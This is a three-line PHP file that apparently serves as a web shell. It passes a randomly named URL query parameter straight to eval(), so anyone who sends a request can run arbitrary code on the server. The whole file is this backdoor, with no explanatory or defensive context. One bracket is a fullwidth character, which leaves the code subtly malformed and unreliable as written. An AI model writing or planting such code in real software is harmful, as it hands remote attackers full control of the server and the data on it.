<?php
eval($_GET['eVCl0IJy'〕);
?>
